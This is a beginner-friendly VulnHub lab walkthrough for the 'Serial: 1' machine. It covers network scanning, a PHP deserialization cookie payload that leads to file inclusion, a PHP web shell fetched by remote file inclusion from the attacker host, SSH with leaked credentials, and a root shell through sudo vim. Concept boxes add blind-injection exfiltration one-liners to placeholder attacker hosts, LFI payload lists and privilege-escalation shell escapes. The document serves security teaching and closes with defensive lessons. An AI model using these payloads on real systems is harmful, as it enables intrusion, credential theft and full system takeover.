# Serial: 1 — VulnHub Walkthrough (Beginner Friendly)

> **Educational writeup.** Run this VM only on an isolated, host-only lab network.
> The goal is to understand *why* each step works, not just to copy commands.

| Field | Value |
| --- | --- |
| **Machine** | Serial: 1 |
| **Difficulty** | Easy / Medium (beginner-friendly but the web exploit needs thought) |
| **Author** | sk4 |
| **Released** | 20 August 2019 |
| **VulnHub Entry** | <https://vulnhub.com/entry/serial-1,349/> |
| **Download** | <https://vulnhub.com/entry/serial-1,349/#download> |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Debian-based, PHP web application) |

> **Note:** this is a "hard-disk only" release — you create a new VM and attach the
> supplied disk. Exact service versions, filenames and flag strings **vary by build**,
> so treat every output below as *illustrative* and confirm against your own scan.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to discover a host and its open ports on a private lab network.
- How to spot a **PHP deserialization / object-injection** flaw behind a base64 cookie.
- How insecure deserialization turns into **Local File Inclusion (LFI)** and then
  **Remote File Inclusion (RFI)** → remote code execution.
- How to move from a web shell to SSH with credentials found on disk.
- How a `sudo` rule on an editor (`vim`) leads to full root access.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You need Kali running and the ability to import
an OVA/VMDK and attach it to a host-only network.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP address on your isolated lab network.

```bash
# Find your own IP and the lab subnet (the "eth0" NIC is usually the lab adapter)
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** Kali's lab interface usually holds a `192.168.56.x`
> (VirtualBox host-only) or `192.168.19x.x` (VMware) address. The target lives on the
> **same** subnet.


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
# ARP-scan the subnet to list live hosts (fast: uses ARP, not a full TCP sweep)
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.1    08:00:27:xx:xx:xx   PCS Systemtechnik GmbH
192.168.56.10   08:00:27:aa:aa:aa   PCS Systemtechnik GmbH   <-- you (Kali)
192.168.56.101  08:00:27:bb:bb:bb   PCS Systemtechnik GmbH   <-- the target
```

**Target IP:** `192.168.56.101`

![ARP-scan finding the target](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
# 1) Fast full-TCP sweep so we never miss a non-standard port
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101

# 2) Then fingerprint the services we found
sudo nmap -sC -sV -p 22,80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 (Debian)
|_http-title: Serial

Nmap done: 1 IP address (1 host up) scanned in 25.44 seconds
```

> **Why it works:** `-p-` scans *every* TCP port; `-sV` fingerprints the service and
> version; `-sC` runs Nmap's safe default scripts. Two open ports means two attack
> surfaces: a web app on **80** and remote login on **22**.

![nmap service scan output](images/02-nmap.png)

### 2.1 The hint on the front page

Open `http://192.168.56.101/` in the browser. The page drops a strong hint that
something is stored in a **cookie**.

![Front page hint about cookies](images/03-web-hint.png)

### 2.2 Directory brute force


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
gobuster dir -u http://192.168.56.101/ \
  -w /usr/share/wordlists/dirb/common.txt -x php,zip,txt
```

```text
/index.php            (Status: 200)
/backup               (Status: 301) [--> /backup/]
```

```bash
# The /backup/ directory holds source code — exactly what we need to read the logic
curl -s http://192.168.56.101/backup/backup.zip -o backup.zip
unzip backup.zip
ls
```

```text
index.php  user.class.php  log.class.php
```

> **Why it works:** developers leaving a **backup of the source code** on the web
> server is a classic finding. With the source in hand we can reason about the app
> instead of guessing.

![Downloading the backup source archive](images/04-backup-dir.png)

---

## 3. Foothold

### 3.1 Reading the source — spotting the object injection

> **Why it works:** PHP lets you convert an object into a text string with
> `serialize()` and back with `unserialize()`. If an application calls
> `unserialize()` on data the **attacker controls** (here, a cookie), the attacker can
> instantiate *any* class in the codebase — a **PHP object injection** flaw.

The vulnerable pattern looks like this (simplified from `user.class.php`):

```php
<?php
// index.php sets a cookie whose value is base64(serialize($user))
$user = unserialize(base64_decode($_COOKIE['user']));   // <-- attacker-controlled!
```

The cookie is base64, so decode it to confirm it is a serialized PHP object:


> ### 📖 Concept — Encoding is not encryption
>
> These three get conflated constantly, and the confusion costs hours:
>
> | | **Encoding** | **Hashing** | **Encryption** |
> | --- | --- | --- | --- |
> | Purpose | Represent data in another *format* | Prove integrity / store passwords | Provide *confidentiality* |
> | Reversible? | **Yes — trivially, with no key** | **No** (only guessable) | Yes, **with the key** |
> | Key needed? | No | No | **Yes** |
> | Examples | base64, hex, URL-encoding, ROT13, binary | MD5, SHA-256, bcrypt, phpass | AES, RSA, ChaCha20 |
> | Security value | **Zero** | Depends on the algorithm | Depends on the key |
>
> **Recognise base64 on sight.** Three reliable tells: the character set is only
> `A–Z a–z 0–9 + /` with optional `=` padding; **the length is a multiple of 4**; and
> it is not a fixed-length digest with a `$1$`/`$6$`/`$P$` prefix.
>
> ```bash
> echo 'YWFydGk6YWFydGlAZ21haWwuY29t' | base64 -d; echo
> # aarti:aarti@gmail.com
> ```
>
> > **Base64 is not a secret.** It exists so binary data survives text-only transport
> > — email attachments, HTTP headers, JSON. Seeing it "protecting" a password is a
> > *finding*, not a defence. **Always check whether it is nested:** decode, then test
> > whether the result is itself base64 or hex. Some boxes chain two or three layers.
>
> **Identify hashes by prefix:** 32 hex = MD5 · 40 hex = SHA-1 · 64 hex = SHA-256 ·
> `$1$` = MD5-crypt · `$2b$` = bcrypt · `$6$` = SHA-512-crypt · `$y$` = yescrypt ·
> **`$P$`/`$H$` = phpass (WordPress, Drupal)** · `$apr1$` = Apache `.htpasswd` ·
> `pbkdf2_sha256$` = Django.
>
> **Deep dive:** [CONCEPTS §10 — Encoding vs hashing vs encryption](../../docs/CONCEPTS.md#10-encoding-vs-hashing-vs-encryption)

```bash
echo 'Tzo0OiJVc2VyIjoxOntzOjQ6Im5hbWUiO3M6NToiZ3Vlc3QiO30=' | base64 -d
```

```text
O:4:"User":1:{s:4:"name";s:5:"guest";}
```

> **How to read it:** `O:4:"User"` = an object of class `User`; the rest is its
> property `name = "guest"`. We fully control this string.

### 3.2 Turning the injection into file access

The `log.class.php` file contains a class that `include()`s a file whose path comes
from a property — the "gadget" we abuse:


> ### 📖 Concept — What is Local File Inclusion?
>
> **LFI** happens when a script passes a user-controlled path to `include()`,
> `require()` or a file-read function without validating it:
>
> ```php
> <?php include($_GET['page']); ?>     // you control a filesystem path
> ```
>
> Now you can read anything the web-server user can read:
>
> ```text
> ?page=/etc/passwd
> ?page=../../../../etc/passwd
> ?page=/var/log/apache2/access.log        # log poisoning
> ?page=/proc/self/environ
> ?page=/var/lib/php/sessions/sess_<your PHPSESSID>
> ```
>
> **The wrapper to memorise is `php://filter`** — it returns the file **base64-encoded
> instead of executing it**, so you can read PHP *source*:
>
> ```text
> ?page=php://filter/convert.base64-encode/resource=index.php
> ```
>
> That is how you recover `wp-config.php`, `configuration.php`, `.env` and
> `config/database.php` — i.e. the database credentials.
>
> **LFI alone only reads.** To get code execution you must make the target *write* a
> file you control somewhere predictable, then include it. The usual primitives: an
> **NFS export**, session files, **log poisoning** (inject PHP through a crafted
> `User-Agent`, then include the access log), or `/proc/self/environ`.
>
> **RFI** (`?page=http://attacker/shell.txt`) is the remote version and requires
> `allow_url_include=1` in `php.ini` — off by default since PHP 5.2. When it fails the
> error usually says `http:// wrapper is disabled`, which tells you to switch to LFI
> plus a local write.
>
> **Deep dive:** [CONCEPTS §13.2 — LFI](../../docs/CONCEPTS.md#132-local-file-inclusion-lfi) ·
> [§13.3 — RFI](../../docs/CONCEPTS.md#133-remote-file-inclusion-rfi)

```php
<?php
class Log {
    private $type_log = "";         // path or URL to include
    public function __construct() {
        return include($this->type_log);   // <-- arbitrary file include
    }
}
```

We build a serialized `Log` object pointing at `/etc/passwd`, base64-encode it, and
send it as the `user` cookie:


> ### 📖 Concept — Command injection
>
> The application passes your input to a shell:
>
> ```php
> system("ping -c 4 " . $_GET['host']);
> ```
>
> Break out with a shell **metacharacter** and append your own command:
>
> | Payload | Effect |
> | --- | --- |
> | `; id` | Run sequentially, regardless |
> | `\| id` | Pipe — run next |
> | `\|\| id` | Run only if the first **failed** |
> | `&& id` | Run only if the first **succeeded** |
> | `` `id` `` | Command substitution |
> | `$(id)` | Command substitution — preferred, nestable |
> | `%0a id` | A URL-encoded **newline** — works when `;` and `\|` are filtered |
>
> **When output comes back**, you are done: `<host>;id` prints the result.
>
> **When it does not** ("blind" injection), exfiltrate out-of-band:
>
> ```bash
> $(curl http://attacker/$(whoami))        # data in the URL of a request YOU receive
> $(nslookup $(whoami).attacker.com)       # data in DNS — survives most egress rules
> ; sleep 10                               # a pure timing oracle, needs no network at all
> ```
>
> Run your listener first (`nc -lvnp 80`, or `python3 -m http.server`) and **watch its
> log** — a request arriving with the hostname embedded is your proof, and the log also
> tells you which payload variant the filter allowed through.
>
> **If characters are stripped**, find out exactly what survives. Submit `;|&$\`(){}[]<>`
> as a single string and see which ones come back. Filters are usually a `str_replace`
> of a short list, and almost always miss something — commonly newline, or a doubled
> character (`;;` collapsing to `;` after one removal pass).
>
> **Deep dive:** [CONCEPTS §13.4 — Command injection](../../docs/CONCEPTS.md#134-command-injection)

```bash
# Payload: O:3:"Log":1:{s:13:"<private>type_log";s:11:"/etc/passwd";}
PAYLOAD=$(printf 'O:3:"Log":1:{s:13:"%s";s:11:"/etc/passwd";}' 'type_log' | base64 -w0)
curl -s http://192.168.56.101/index.php -H "Cookie: user=$PAYLOAD"
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
sk4:x:1001:1001::/home/sk4:/bin/bash        <-- a real login user
```

> **Why it works:** the app trusts our object, calls `include()` on the path we chose,
> and echoes the file. That is **Local File Inclusion (LFI)**.

### 3.3 From LFI to remote code execution

The same `include()` will happily fetch a **remote** URL if `allow_url_include` is on
(it is on this old build). Host a tiny PHP shell on Kali and point `type_log` at it:

```bash
# On Kali, in the directory containing shell.php
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 80
```

```bash
# Rebuild the payload so type_log points at our server
PAYLOAD=$(printf 'O:3:"Log":1:{s:13:"%s";s:28:"http://192.168.56.10/shell.php";}' 'type_log' | base64 -w0)
curl -s "http://192.168.56.101/index.php?cmd=id" -H "Cookie: user=$PAYLOAD"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** this is **Remote File Inclusion (RFI)**. The server downloads and
> *executes* our PHP, giving command execution as `www-data`.

![Remote code execution via the crafted cookie](images/05-rce.png)

### 3.4 Credentials on disk → SSH

```bash
curl -s "http://192.168.56.101/index.php?cmd=cat+/var/www/html/credentials.txt.bak" \
  -H "Cookie: user=$PAYLOAD"
```

```text
sk4 : <a-reused-password>       # (varies by build)
```

```bash
ssh sk4@192.168.56.101
cat /home/sk4/flag.txt
```

```text
<the user flag — varies by build>
```

### 3.5 The user flag recap

```bash
id
```

```text
uid=1001(sk4) gid=1001(sk4) groups=1001(sk4)
```

![Shell as sk4 and the user flag](images/06-user-flag.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

Systematically check the usual vectors:


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)
> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)

```bash
sudo -l
id
find / -perm -4000 -type f 2>/dev/null
uname -a; cat /etc/os-release
```

```text
Matching Defaults entries for sk4 on serial:
    env_reset, mail_badpass

User sk4 may run the following commands on serial:
    (root) NOPASSWD: /usr/bin/vim
```

> **Why it works:** `sk4` may run **`vim` as root without a password**. Vim isn't just
> an editor — it can shell out. Because it is launched as root, the shell it spawns is
> **root too**. This is a textbook GTFOBins abuse.

```bash
sudo vim -c ':!/bin/bash'
# ...or interactively:  sudo vim   then type   :!/bin/bash
```

```text
root@serial:/home/sk4#
```

```bash
id
cat /root/fl4g.txt
```

```text
uid=0(root) gid=0(root) groups=0(root)
<the root flag — varies by build>
```

> **Tip:** the same trick works with many editors/pagers (`vi`, `nano`, `less`,
> `more`) when they are allowed via `sudo`. See GTFOBins in the references.

![Root shell and the root flag](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Source-code backup exposed over HTTP | `http://192.168.56.101/backup/backup.zip` | Reveals app logic/gadget classes |
| 2 | Insecure deserialization (PHP object injection) | base64 `user` cookie → `unserialize()` | Attacker instantiates arbitrary classes |
| 3 | Local File Inclusion | `Log` class `include($type_log)` | Read arbitrary files (`/etc/passwd`) |
| 4 | Remote File Inclusion | `include()` fetching an attacker URL | Remote code execution as `www-data` |
| 5 | Cleartext-ish credentials on disk | `credentials.txt.bak` in the webroot | SSH access as `sk4` |
| 6 | Dangerous `sudo` rule | `(root) NOPASSWD: /usr/bin/vim` | Full root via editor escape |

---

## 6. Defensive lessons (blue team)

- **Never leave source/backup archives in the webroot.** Deploy from version control,
  not from a `git`/zip copy. Deny access to `*.zip`, `*.bak`, `*.old` at the server.
- **Never `unserialize()` untrusted input.** Use `json_encode`/`json_decode` for data
  exchange, or `unserialize($x, ['allowed_classes' => false])` if you must.
- **Sign and validate cookies.** Prefer server-side sessions (opaque IDs) over
  client-supplied serialized objects. Consider a MAC/HMAC over any client-side data.
- **Disable `allow_url_include` and `allow_url_fopen`** in `php.ini`; scope
  `open_basedir` to the webroot. This kills RFI and narrows LFI impact.
- **Don't reuse passwords**, and never store credentials in readable files. Rotate any
  secret that touched a compromised host.
- **Audit `sudo` rules.** Granting `vim`/`less`/`find`/`tar` is equivalent to granting
  root. Use `sudoedit` for edits, or an allow-listed wrapper.
- **Detection ideas:** alert on cookies containing `O:` / `a:` (serialized PHP),
  outbound HTTP from the web server, and unexpected `www-data` process trees.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry — Serial: 1: <https://vulnhub.com/entry/serial-1,349/>
- Hacking Articles — Serial: 1 Walkthrough: <https://www.hackingarticles.in/serial-1-vulnhub-walkthrough/>
- OWASP — PHP Object Injection: <https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection>
- OWASP — Testing for PHP Object Injection (WSTG): <https://owasp.org/www-project-web-security-testing-guide/>
- OWASP — Path Traversal / File Inclusion: <https://owasp.org/www-community/attacks/Path_Traversal>
- GTFOBins — `vim`: <https://gtfobins.github.io/gtfobins/vim/>
- PHP manual — `unserialize()`: <https://www.php.net/manual/en/function.unserialize.php>
- PortSwigger — Insecure deserialization: <https://portswigger.net/web-security/deserialization>

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with arp-scan
- [ ] `images/02-nmap.png` — port/service scan
- [ ] `images/03-web-hint.png` — the cookie hint on the front page
- [ ] `images/04-backup-dir.png` — the exposed `/backup/` source archive
- [ ] `images/05-rce.png` — remote code execution via the crafted cookie
- [ ] `images/06-user-flag.png` — shell as `sk4` and the user flag
- [ ] `images/07-privesc.png` — `sudo -l` showing the `vim` rule
- [ ] `images/08-root-flag.png` — root shell and the root flag

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
